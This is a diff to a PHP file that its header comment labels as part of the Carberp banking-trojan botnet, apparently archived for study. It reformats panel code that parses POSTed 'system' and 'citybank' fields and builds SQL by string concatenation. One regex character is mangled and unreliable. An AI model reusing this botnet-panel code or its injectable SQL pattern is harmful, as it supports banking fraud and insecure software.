@@ -1,16 +1,31 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
 
-if(strstr($_POST['system'], '|') != false){	$_POST['system'] = explode('|', $_POST['system']);
-}elseif(!empty($_POST['system']) && !is_array($_POST['system'])){	$system = $_POST['system'];
+if(strstr($_POST['system'], '|') != false){
+	$_POST['system'] = explode('|', $_POST['system']);
+}elseif(!empty($_POST['system']) && !is_array($_POST['system'])){
+	$system = $_POST['system'];
 	$_POST['system'] = array();
 	$_POST['system'][] = $system;
 }
 
 function cuto($t){
-	if(!is_array($t)){		return str_replace("'", '', $t);
-	}else{		return $t;
+	if(!is_array($t)){
+		return str_replace("'", '', $t);
+	}else{
+		return $t;
 	}
 }
 
@@ -122,7 +137,7 @@ if(is_array($_POST['system']) && count($_POST['system']) > 0){
 		
 		if(!empty($_POST['citybank'])){
 			$_POST['citybank'] = mb_strtolower($_POST['citybank'], 'UTF8');
-			$_POST['citybank'] = preg_replace('~^�.~', '', $_POST['citybank'], 1);
+			$_POST['citybank'] = preg_replace('~^�.~', '', $_POST['citybank'], 1);
 		}
 		
 		if(!empty($_POST['check_city']) && $_POST['check_city'] == 1){
@@ -153,7 +168,8 @@ if(is_array($_POST['system']) && count($_POST['system']) > 0){
 		}
 		$smarty->assign("errors", $errors);
     }
-}else{	if($_SESSION['user']->config['infoacc'] == '1'){
+}else{
+	if($_SESSION['user']->config['infoacc'] == '1'){
 		foreach($_SESSION['user']->config['systems'] as $key => $item){
 			$sql .= ' OR (nid = \''.$key.'\')';
 		}
